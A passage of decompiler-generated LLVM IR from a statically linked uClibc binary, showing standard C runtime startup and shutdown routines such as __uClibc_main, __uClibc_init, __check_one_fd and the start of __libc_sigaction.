dec_label_pc_8054a25:                             ; preds = %dec_label_pc_8054a19, %dec_label_pc_8054a12, %dec_label_pc_8054a0b, %dec_label_pc_8054a04, %dec_label_pc_80549fd, %dec_label_pc_80549f1, %dec_label_pc_80549ea, %dec_label_pc_80549e3, %dec_label_pc_80549dc, %dec_label_pc_80549d5, %dec_label_pc_80549c7, %dec_label_pc_80549c0, %dec_label_pc_80549ce, %dec_label_pc_80549a5, %dec_label_pc_805499b, %dec_label_pc_8054991, %dec_label_pc_8054987, %dec_label_pc_805497d, %dec_label_pc_8054973, %dec_label_pc_8054969, %dec_label_pc_805495f, %dec_label_pc_8054955, %dec_label_pc_805494b, %dec_label_pc_8054939, %dec_label_pc_8054927, %dec_label_pc_805491d, %dec_label_pc_8054913, %dec_label_pc_80548f9, %dec_label_pc_80549f8, %dec_label_pc_8054a20
  %v0_8054a28 = phi i32 [ 255, %dec_label_pc_8054a19 ], [ 2048, %dec_label_pc_8054a12 ], [ 99, %dec_label_pc_8054a0b ], [ 20, %dec_label_pc_8054a04 ], [ -128, %dec_label_pc_80549fd ], [ 1024, %dec_label_pc_80549f1 ], [ 4, %dec_label_pc_80549ea ], [ 32, %dec_label_pc_80549e3 ], [ 256, %dec_label_pc_80549dc ], [ 2147483647, %dec_label_pc_80549d5 ], [ 16, %dec_label_pc_80549c7 ], [ 127, %dec_label_pc_80549c0 ], [ 200112, %dec_label_pc_80549ce ], [ 9, %dec_label_pc_80549a5 ], [ 65535, %dec_label_pc_805499b ], [ -32768, %dec_label_pc_8054991 ], [ -2147483648, %dec_label_pc_8054987 ], [ 8, %dec_label_pc_805497d ], [ 500, %dec_label_pc_8054973 ], [ 4096, %dec_label_pc_8054969 ], [ 16384, %dec_label_pc_805495f ], [ 1000, %dec_label_pc_8054955 ], [ 32768, %dec_label_pc_805494b ], [ 6, %dec_label_pc_8054939 ], [ 65536, %dec_label_pc_8054927 ], [ 100, %dec_label_pc_805491d ], [ 131072, %dec_label_pc_8054913 ], [ 1, %dec_label_pc_80548f9 ], [ -1, %dec_label_pc_80549f8 ], [ 32767, %dec_label_pc_8054a20 ]
  ret i32 %v0_8054a28

; uselistorder directives
  uselistorder i32 1000, { 2, 0, 1, 3 }
  uselistorder i32 16384, { 0, 10, 5, 6, 7, 8, 9, 1, 2, 3, 4 }
  uselistorder i32 -2147483648, { 4, 6, 0, 5, 7, 1, 2, 3 }
  uselistorder i32 (i32)* @getdtablesize, { 3, 2, 1, 0 }
  uselistorder i32 149, { 2, 1, 3, 0 }
  uselistorder i32 130, { 1, 0 }
  uselistorder i32 129, { 2, 0, 1 }
  uselistorder i32 126, { 1, 0 }
  uselistorder i32 125, { 1, 0 }
  uselistorder i32 124, { 2, 1, 0 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 122, { 1, 0 }
  uselistorder i32 121, { 1, 0 }
  uselistorder i32 119, { 1, 0 }
  uselistorder i32 118, { 1, 0 }
  uselistorder i32 117, { 1, 0 }
  uselistorder i32 115, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 113, { 1, 0 }
  uselistorder i32 111, { 1, 0 }
  uselistorder i32 110, { 2, 0, 1 }
  uselistorder i32 109, { 1, 0 }
  uselistorder i32 108, { 1, 0 }
  uselistorder i32 107, { 1, 0 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 105, { 1, 0 }
  uselistorder i32 103, { 1, 0 }
  uselistorder i32 99, { 1, 2, 0 }
  uselistorder i32 98, { 1, 0 }
  uselistorder i32 96, { 1, 0 }
  uselistorder i32 95, { 4, 2, 1, 3, 0 }
  uselistorder i32 94, { 1, 0 }
  uselistorder i32 93, { 1, 0 }
  uselistorder i32 92, { 2, 1, 0 }
  uselistorder i32 91, { 1, 0 }
  uselistorder i32 90, { 1, 0 }
  uselistorder i32 89, { 1, 0 }
  uselistorder i32 87, { 1, 2, 0 }
  uselistorder i32 86, { 1, 0 }
  uselistorder i32 85, { 1, 0 }
  uselistorder i32 83, { 1, 0 }
  uselistorder i32 82, { 1, 0 }
  uselistorder i32 81, { 1, 0 }
  uselistorder i32 79, { 1, 0 }
  uselistorder i32 78, { 1, 0 }
  uselistorder i32 77, { 1, 0 }
  uselistorder i32 76, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 74, { 1, 0 }
  uselistorder i32 73, { 1, 0 }
  uselistorder i32 71, { 1, 0 }
  uselistorder i32 70, { 2, 3, 1, 0 }
  uselistorder i32 66, { 1, 0 }
  uselistorder i32 65, { 1, 0, 2, 3 }
  uselistorder i32 63, { 1, 2, 0 }
  uselistorder i32 62, { 1, 0 }
  uselistorder i32 61, { 1, 0 }
  uselistorder i32 59, { 1, 0 }
  uselistorder i32 57, { 2, 1, 0 }
  uselistorder i32 55, { 1, 2, 0 }
  uselistorder i32 54, { 1, 0 }
  uselistorder i32 53, { 2, 1, 0 }
  uselistorder i32 50, { 3, 0, 1, 2 }
  uselistorder i32 49, { 1, 0 }
  uselistorder i32 47, { 2, 0, 1 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 38, { 2, 3, 1, 0 }
  uselistorder i32 30, { 7, 2, 1, 3, 4, 0, 5, 6 }
  uselistorder i32 29, { 1, 0 }
  uselistorder i32 26, { 3, 2, 1, 0 }
  uselistorder i32 25, { 1, 0 }
  uselistorder i32 23, { 2, 3, 1, 0 }
  uselistorder i32 19, { 3, 2, 0, 1 }
  uselistorder i32 18, { 1, 0 }
  uselistorder i32 13, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8054a25, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_80549f8, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_80549ce, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_805494b, { 1, 0 }
  uselistorder label %dec_label_pc_8054939, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054a2c = load i32, i32* @ebx, align 4
  store i32 %v0_8054a2c, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805d000.559 to i32), i32 -134598656), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805d000.559 to i32), i32 -134598656), i32 2), i32 0), label %dec_label_pc_8054a40, label %dec_label_pc_8054a4d

dec_label_pc_8054a40:                             ; preds = %entry, %dec_label_pc_8054a40
  %v1_8054a478 = phi i32 [ %v1_8054a47, %dec_label_pc_8054a40 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805d000.559 to i32), i32 -134598656), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_8054a47.560 to i32), i32* %stack_var_-16, align 4
  %v5_8054a40 = mul i32 %v1_8054a478, 4
  %v6_8054a40 = add i32 %v5_8054a40, ptrtoint (i32* @global_var_805d000.559 to i32)
  %v7_8054a40 = inttoptr i32 %v6_8054a40 to i32*
  %v8_8054a40 = load i32, i32* %v7_8054a40, align 4
  call void @__pseudo_call(i32 %v8_8054a40)
  %v0_8054a47.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054a47 = add i32 %v0_8054a47.pre, -1
  store i32 %v1_8054a47, i32* %ebx.global-to-local, align 4
  %v10_8054a48 = icmp eq i32 %v0_8054a47.pre, 0
  %v1_8054a4b = icmp eq i1 %v10_8054a48, false
  br i1 %v1_8054a4b, label %dec_label_pc_8054a40, label %dec_label_pc_8054a4d

dec_label_pc_8054a4d:                             ; preds = %dec_label_pc_8054a40, %entry
  %v0_8054a4d = load i32, i32* @global_var_80636d4.561, align 4
  %v1_8054a52 = icmp eq i32 %v0_8054a4d, 0
  br i1 %v1_8054a52, label %dec_label_pc_8054a58, label %dec_label_pc_8054a56

dec_label_pc_8054a56:                             ; preds = %dec_label_pc_8054a4d
  %v0_8054a56 = load i32, i32* %stack_var_-16, align 4
  %v1_8054a56 = call i32 @unknown_0(i32 %v0_8054a56)
  br label %dec_label_pc_8054a58

dec_label_pc_8054a58:                             ; preds = %dec_label_pc_8054a56, %dec_label_pc_8054a4d
  %v0_8054a58 = load i32, i32* @global_var_80636d8.562, align 8
  %v1_8054a5e = icmp eq i32 %v0_8054a58, 0
  br i1 %v1_8054a5e, label %dec_label_pc_8054a67, label %dec_label_pc_8054a62

dec_label_pc_8054a62:                             ; preds = %dec_label_pc_8054a58
  %v2_8054a62 = load i32, i32* %stack_var_-16, align 4
  %v1_8054a65 = call i32 @unknown_0(i32 %v2_8054a62)
  br label %dec_label_pc_8054a67

dec_label_pc_8054a67:                             ; preds = %dec_label_pc_8054a62, %dec_label_pc_8054a58
  %v2_8054a67 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_8054a67

; uselistorder directives
  uselistorder i32 %v1_8054a47, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8054a40, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8054a6e = load i32, i32* @eax, align 4
  ret i32 %v0_8054a6e
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8054a6f = load i32, i32* @esi, align 4
  %v0_8054a70 = load i32, i32* @ebx, align 4
  store i32 %v0_8054a70, i32* %stack_var_-8, align 4
  %v0_8054a74 = load i32, i32* @eax, align 4
  store i32 %v0_8054a74, i32* @esi, align 4
  %v0_8054a76 = load i32, i32* @edx, align 4
  store i32 %v0_8054a76, i32* @ebx, align 4
  %v4_8054a7b = call i32 @__libc_fcntl(i32 %v0_8054a74, i32 1, i32 %tmp6)
  %v8_8054a83 = icmp eq i32 %v4_8054a7b, -1
  %v1_8054a84 = icmp eq i1 %v8_8054a83, false
  br i1 %v1_8054a84, label %dec_label_pc_8054a9f, label %dec_label_pc_8054a86

dec_label_pc_8054a86:                             ; preds = %entry
  %v0_8054a88 = load i32, i32* @ebx, align 4
  %v5_8054a8e = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805c50c.563, i32 0, i32 0), i32 %v0_8054a88)
  %v1_8054a96 = load i32, i32* @esi, align 4
  %v12_8054a96 = icmp eq i32 %v5_8054a8e, %v1_8054a96
  br i1 %v12_8054a96, label %dec_label_pc_8054a9f, label %dec_label_pc_8054a9a

dec_label_pc_8054a9a:                             ; preds = %dec_label_pc_8054a86
  %v0_8054a9a = call i32 @abort()
  br label %dec_label_pc_8054a9f

dec_label_pc_8054a9f:                             ; preds = %entry, %dec_label_pc_8054a86, %dec_label_pc_8054a9a
  %v2_8054a9f = load i32, i32* %stack_var_-12, align 4
  %v2_8054aa0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054aa0, i32* @ebx, align 4
  store i32 %v0_8054a6f, i32* @esi, align 4
  ret i32 %v2_8054a9f

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8054a9f, { 2, 1, 0 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_8054aa6 = load i8, i8* @global_var_80636dc.564, align 4
  %v1_8054aa6 = icmp eq i8 %v0_8054aa6, 0
  %v1_8054aad = icmp eq i1 %v1_8054aa6, false
  br i1 %v1_8054aad, label %entry.dec_label_pc_8054adf_crit_edge, label %dec_label_pc_8054aaf

entry.dec_label_pc_8054adf_crit_edge:             ; preds = %entry
  %v0_8054ae2.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8054adf

dec_label_pc_8054aaf:                             ; preds = %entry
  store i8 1, i8* @global_var_80636dc.564, align 4
  store i32 4096, i32* @global_var_80636d0.565, align 16
  %v0_8054ada = call i32 @_stdio_init()
  br label %dec_label_pc_8054adf

dec_label_pc_8054adf:                             ; preds = %entry.dec_label_pc_8054adf_crit_edge, %dec_label_pc_8054aaf
  %v0_8054ae2 = phi i32 [ %v0_8054ae2.pre, %entry.dec_label_pc_8054adf_crit_edge ], [ %v0_8054ada, %dec_label_pc_8054aaf ]
  ret i32 %v0_8054ae2

; uselistorder directives
  uselistorder i8* @global_var_80636dc.564, { 1, 0 }
  uselistorder label %dec_label_pc_8054adf, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %tmp31, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_80636c8.566, align 8
  store i32 %arg6, i32* @global_var_80636d8.562, align 8
  %v2_8054b1a = mul i32 %arg2, 4
  %v3_8054b1a = add i32 %tmp31, %v2_8054b1a
  store i32 %v3_8054b1a, i32* %edx.global-to-local, align 4
  %v1_8054b1d = add i32 %v3_8054b1a, 4
  store i32 %v1_8054b1d, i32* @global_var_80636cc.557, align 4
  %v3_8054b25 = load i32, i32* %arg3, align 4
  %v14_8054b25 = icmp eq i32 %v1_8054b1d, %v3_8054b25
  %v1_8054b27 = icmp eq i1 %v14_8054b25, false
  br i1 %v1_8054b27, label %dec_label_pc_8054b2f, label %dec_label_pc_8054b29

dec_label_pc_8054b29:                             ; preds = %entry
  store i32 %v3_8054b1a, i32* @global_var_80636cc.557, align 4
  br label %dec_label_pc_8054b2f

dec_label_pc_8054b2f:                             ; preds = %entry, %dec_label_pc_8054b29
  %v0_8054b2f = load i32, i32* @ecx, align 4
  store i32 %v0_8054b2f, i32* %stack_var_-160, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_8054b34 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8054b39 = bitcast i32* %stack_var_-136 to i8*
  %v4_8054b39 = call i32 @__GI_memset(i8* %v3_8054b39, i32 0, i32 120)
  %v0_8054b3e = load i32, i32* @global_var_80636cc.557, align 4
  br label %dec_label_pc_8054b46

dec_label_pc_8054b46:                             ; preds = %dec_label_pc_8054b46, %dec_label_pc_8054b2f
  %v0_8054b46 = phi i32 [ %v1_8054b49, %dec_label_pc_8054b46 ], [ %v0_8054b3e, %dec_label_pc_8054b2f ]
  %v1_8054b46 = inttoptr i32 %v0_8054b46 to i32*
  %v2_8054b46 = load i32, i32* %v1_8054b46, align 4
  %v3_8054b46 = icmp eq i32 %v2_8054b46, 0
  %v1_8054b49 = add i32 %v0_8054b46, 4
  %v1_8054b4c = icmp eq i1 %v3_8054b46, false
  br i1 %v1_8054b4c, label %dec_label_pc_8054b46, label %dec_label_pc_8054b6d.preheader

dec_label_pc_8054b6d.preheader:                   ; preds = %dec_label_pc_8054b46
  store i32 %v1_8054b49, i32* @ebx, align 4
  %v1_8054b6d1 = inttoptr i32 %v1_8054b49 to i32*
  %v2_8054b6d2 = load i32, i32* %v1_8054b6d1, align 4
  %v3_8054b6d3 = icmp eq i32 %v2_8054b6d2, 0
  %v1_8054b7010 = icmp eq i1 %v3_8054b6d3, false
  br i1 %v1_8054b7010, label %dec_label_pc_8054b52.lr.ph, label %dec_label_pc_8054b72

dec_label_pc_8054b52.lr.ph:                       ; preds = %dec_label_pc_8054b6d.preheader
  %v3_8054b32 = ptrtoint i32* %stack_var_-168 to i32
  %v3_8054b5d = add i32 %v3_8054b32, 32
  br label %dec_label_pc_8054b52

dec_label_pc_8054b52:                             ; preds = %dec_label_pc_8054b52.lr.ph, %dec_label_pc_8054b6a
  %v1_8054b5d = phi i32 [ %v2_8054b6d2, %dec_label_pc_8054b52.lr.ph ], [ %v2_8054b6d, %dec_label_pc_8054b6a ]
  %v0_8054b5c = phi i32 [ %v1_8054b49, %dec_label_pc_8054b52.lr.ph ], [ %v1_8054b6a, %dec_label_pc_8054b6a ]
  %v6_8054b57 = icmp ugt i32 %v1_8054b5d, 14
  br i1 %v6_8054b57, label %dec_label_pc_8054b6a, label %dec_label_pc_8054b59

dec_label_pc_8054b59:                             ; preds = %dec_label_pc_8054b52
  %v0_8054b59 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8054b59, i32* %stack_var_-160, align 4
  store i32 %v0_8054b5c, i32* %stack_var_-168, align 4
  %v2_8054b5d = mul i32 %v1_8054b5d, 8
  %v4_8054b5d = add i32 %v3_8054b5d, %v2_8054b5d
  %v3_8054b62 = inttoptr i32 %v4_8054b5d to i16*
  %v4_8054b62 = call i32 @memcpy(i16* %v3_8054b62, i32 %v0_8054b5c, i32 8)
  %v0_8054b6a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054b6a

dec_label_pc_8054b6a:                             ; preds = %dec_label_pc_8054b52, %dec_label_pc_8054b59
  %v0_8054b6a = phi i32 [ %v0_8054b5c, %dec_label_pc_8054b52 ], [ %v0_8054b6a.pre, %dec_label_pc_8054b59 ]
  %v1_8054b6a = add i32 %v0_8054b6a, 8
  store i32 %v1_8054b6a, i32* @ebx, align 4
  %v1_8054b6d = inttoptr i32 %v1_8054b6a to i32*
  %v2_8054b6d = load i32, i32* %v1_8054b6d, align 4
  %v3_8054b6d = icmp eq i32 %v2_8054b6d, 0
  %v1_8054b70 = icmp eq i1 %v3_8054b6d, false
  br i1 %v1_8054b70, label %dec_label_pc_8054b52, label %dec_label_pc_8054b72

dec_label_pc_8054b72:                             ; preds = %dec_label_pc_8054b6a, %dec_label_pc_8054b6d.preheader
  store i32 %v2_8054b34, i32* @eax, align 4
  %v0_8054b76 = call i32 @_dl_aux_init()
  store i32 %v0_8054b76, i32* @eax, align 4
  %v0_8054b7b = call i32 @__GI___uClibc_init()
  %v1_8054b84 = icmp eq i32 %tmp26, 0
  %v1_8054b86 = icmp eq i1 %v1_8054b84, false
  br i1 %v1_8054b86, label %dec_label_pc_8054b8c, label %dec_label_pc_8054b88

dec_label_pc_8054b88:                             ; preds = %dec_label_pc_8054b72
  %v1_8054b88 = and i32 %tmp26, -65536
  %v2_8054b88 = or i32 %v1_8054b88, 4096
  br label %dec_label_pc_8054b8c

dec_label_pc_8054b8c:                             ; preds = %dec_label_pc_8054b72, %dec_label_pc_8054b88
  %v0_8054b8c = phi i32 [ %tmp26, %dec_label_pc_8054b72 ], [ %v2_8054b88, %dec_label_pc_8054b88 ]
  store i32 %v0_8054b8c, i32* @global_var_80636d0.565, align 16
  %v13_8054b91 = icmp eq i32 %tmp25, -1
  %v1_8054b96 = icmp eq i1 %v13_8054b91, false
  br i1 %v1_8054b96, label %dec_label_pc_8054bc1, label %dec_label_pc_8054b98

dec_label_pc_8054b98:                             ; preds = %dec_label_pc_8054b8c
  %v0_8054b98 = call i32 @getuid()
  store i32 %v0_8054b98, i32* @ebx, align 4
  %v0_8054b9f = call i32 @geteuid()
  %v0_8054ba4 = load i32, i32* @ebx, align 4
  %v12_8054ba4 = icmp eq i32 %v0_8054ba4, %v0_8054b9f
  %v1_8054ba6 = icmp eq i1 %v12_8054ba4, false
  br i1 %v1_8054ba6, label %dec_label_pc_8054bd7, label %dec_label_pc_8054ba8

dec_label_pc_8054ba8:                             ; preds = %dec_label_pc_8054b98
  %v0_8054ba8 = call i32 @getgid()
  store i32 %v0_8054ba8, i32* @ebx, align 4
  %v0_8054baf = call i32 @getegid()
  %v0_8054bb4 = load i32, i32* @ebx, align 4
  %v12_8054bb4 = icmp eq i32 %v0_8054bb4, %v0_8054baf
  %v1_8054bb6 = icmp eq i1 %v12_8054bb4, false
  br i1 %v1_8054bb6, label %dec_label_pc_8054bd7, label %dec_label_pc_8054bb8.thread

dec_label_pc_8054bb8.thread:                      ; preds = %dec_label_pc_8054ba8
  br label %dec_label_pc_8054c01

dec_label_pc_8054bc1:                             ; preds = %dec_label_pc_8054b8c
  %v15_8054bc1 = icmp eq i32 %tmp25, %tmp24
  %v1_8054bc5 = icmp eq i1 %v15_8054bc1, false
  br i1 %v1_8054bc5, label %dec_label_pc_8054bd7, label %dec_label_pc_8054bc7

dec_label_pc_8054bc7:                             ; preds = %dec_label_pc_8054bc1
  br label %dec_label_pc_8054bd7

dec_label_pc_8054bd7:                             ; preds = %dec_label_pc_8054bc7, %dec_label_pc_8054bc1, %dec_label_pc_8054ba8, %dec_label_pc_8054b98
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8054bde = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8054bed = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8054bfc = call i32 @__check_one_fd()
  br label %dec_label_pc_8054c01

dec_label_pc_8054c01:                             ; preds = %dec_label_pc_8054bb8.thread, %dec_label_pc_8054bd7
  store i32 ptrtoint (i32* @global_var_805d000.559 to i32), i32* %esi.global-to-local, align 4
  %v0_8054c06 = load i32, i32* @edi, align 4
  %v1_8054c06 = inttoptr i32 %v0_8054c06 to i32*
  %v2_8054c06 = load i32, i32* %v1_8054c06, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_805d000.559 to i32), i32 -134598656), i32* %esi.global-to-local, align 4
  store i32 %v2_8054c06, i32* inttoptr (i32 134599736 to i32*), align 8
  store i32 sdiv (i32 add (i32 ptrtoint (i32* @global_var_805d000.559 to i32), i32 -134598656), i32 4), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_80636d4.561, align 4
  br i1 icmp ugt (i32 add (i32 ptrtoint (i32* @global_var_805d000.559 to i32), i32 -134598653), i32 6), label %dec_label_pc_8054c26, label %dec_label_pc_8054c32

dec_label_pc_8054c26:                             ; preds = %dec_label_pc_8054c01, %dec_label_pc_8054c26
  %v4_8054c2647 = phi i32 [ %v1_8054c2d, %dec_label_pc_8054c26 ], [ 0, %dec_label_pc_8054c01 ]
  store i32 ptrtoint (i32* @global_var_8054c2d.568 to i32), i32* %stack_var_-160, align 4
  %v5_8054c26 = mul i32 %v4_8054c2647, 4
  %v6_8054c26 = add i32 %v5_8054c26, ptrtoint (i32* @global_var_805d000.559 to i32)
  %v7_8054c26 = inttoptr i32 %v6_8054c26 to i32*
  %v8_8054c26 = load i32, i32* %v7_8054c26, align 4
  call void @__pseudo_call(i32 %v8_8054c26)
  %v0_8054c2d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054c2d = add i32 %v0_8054c2d, 1
  store i32 %v1_8054c2d, i32* %ebx.global-to-local, align 4
  %v1_8054c2e.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8054c2e = icmp ult i32 %v1_8054c2d, %v1_8054c2e.pre
  br i1 %v7_8054c2e, label %dec_label_pc_8054c26, label %dec_label_pc_8054c32

dec_label_pc_8054c32:                             ; preds = %dec_label_pc_8054c26, %dec_label_pc_8054c01
  store i32 134564920, i32* %stack_var_-160, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805d000.559 to i32), i32 -134598656), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805d000.559 to i32), i32 -134598656), i32 2), i32 0), label %dec_label_pc_8054c4a, label %dec_label_pc_8054c56

dec_label_pc_8054c4a:                             ; preds = %dec_label_pc_8054c32, %dec_label_pc_8054c4a
  %v4_8054c4a44 = phi i32 [ %v1_8054c51, %dec_label_pc_8054c4a ], [ 0, %dec_label_pc_8054c32 ]
  store i32 ptrtoint (i32* @global_var_8054c51.569 to i32), i32* %stack_var_-160, align 4
  %v5_8054c4a = mul i32 %v4_8054c4a44, 4
  %v6_8054c4a = add i32 %v5_8054c4a, ptrtoint (i32* @global_var_805d000.559 to i32)
  %v7_8054c4a = inttoptr i32 %v6_8054c4a to i32*
  %v8_8054c4a = load i32, i32* %v7_8054c4a, align 4
  call void @__pseudo_call(i32 %v8_8054c4a)
  %v0_8054c51 = load i32, i32* @ebx, align 4
  %v1_8054c51 = add i32 %v0_8054c51, 1
  store i32 %v1_8054c51, i32* @ebx, align 4
  %v1_8054c52.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8054c52 = icmp ult i32 %v1_8054c51, %v1_8054c52.pre
  br i1 %v7_8054c52, label %dec_label_pc_8054c4a, label %dec_label_pc_8054c56

dec_label_pc_8054c56:                             ; preds = %dec_label_pc_8054c4a, %dec_label_pc_8054c32
  %v0_8054c5f = load i32, i32* %stack_var_-160, align 4
  %v1_8054c5f = call i32 @__errno_location(i32 %v0_8054c5f)
  %v1_8054c64 = inttoptr i32 %v1_8054c5f to i32*
  store i32 0, i32* %v1_8054c64, align 4
  %v0_8054c73 = call i32 @__GI___h_errno_location()
  store i32 %v0_8054c73, i32* @eax, align 4
  %v1_8054c78 = inttoptr i32 %v0_8054c73 to i32*
  store i32 0, i32* %v1_8054c78, align 4
  %v0_8054c7e = load i32, i32* @eax, align 4
  store i32 %v0_8054c7e, i32* %stack_var_-160, align 4
  %v0_8054c85 = load i32, i32* @edi, align 4
  store i32 %v0_8054c85, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_8054c94 = load i32, i32* @eax, align 4
  %v1_8054c97 = call i32 @__GI_exit(i32 %v0_8054c94)
  %v0_8054ca1 = load i32, i32* @ebx, align 4
  %v1_8054ca1 = inttoptr i32 %v0_8054ca1 to %sigcontext*
  %v2_8054ca1 = call i32 @sigreturn(%sigcontext* %v1_8054ca1)
  %v0_8054ca9 = load i32, i32* @ebx, align 4
  %v1_8054ca9 = inttoptr i32 %v0_8054ca9 to %sigcontext*
  %v2_8054ca9 = call i32 @sigreturn(%sigcontext* %v1_8054ca9)
  ret i32 %v2_8054ca9

; uselistorder directives
  uselistorder i32 %v1_8054c51, { 1, 2, 0 }
  uselistorder i32 %v1_8054c2d, { 1, 2, 0 }
  uselistorder i32 %v2_8054b6d, { 1, 0 }
  uselistorder i32 %v1_8054b6a, { 2, 1, 0 }
  uselistorder i32 %v1_8054b49, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8054b46, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805d000.559 to i32), i32 -134598656), i32 2), { 0, 2, 3, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805d000.559 to i32), i32 -134598656), { 0, 2, 1 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 14, { 2, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_8054c4a, { 1, 0 }
  uselistorder label %dec_label_pc_8054c26, { 1, 0 }
  uselistorder label %dec_label_pc_8054c01, { 1, 0 }
  uselistorder label %dec_label_pc_8054b8c, { 1, 0 }
  uselistorder label %dec_label_pc_8054b6a, { 1, 0 }
  uselistorder label %dec_label_pc_8054b52, { 1, 0 }
  uselistorder label %dec_label_pc_8054b2f, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8054cab = load i32, i32* @esi, align 4
  %v0_8054cac = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8054cc1 = icmp eq i32* %arg2, null
  br i1 %v1_8054cc1, label %dec_label_pc_8054d14, label %dec_label_pc_8054cc5

dec_label_pc_8054cc5:                             ; preds = %entry
  %v2_8054cc5 = load i32, i32* %arg2, align 4
  store i32 %v2_8054cc5, i32* %stack_var_-148, align 4
  %v1_8054cce = add i32 %tmp11, 4
  %v3_8054ce0 = bitcast i32* %stack_var_-136 to i16*
  %v4_8054ce0 = call i32 @memcpy(i16* %v3_8054ce0, i32 %v1_8054cce, i32 128)
  %v1_8054ce5 = add i32 %tmp11, 132
  %v2_8054cff = inttoptr i32 %v1_8054ce5 to i8*
  %v3_8054cff = load i8, i8* %v2_8054cff, align 1
  %v4_8054cff = and i8 %v3_8054cff, 4
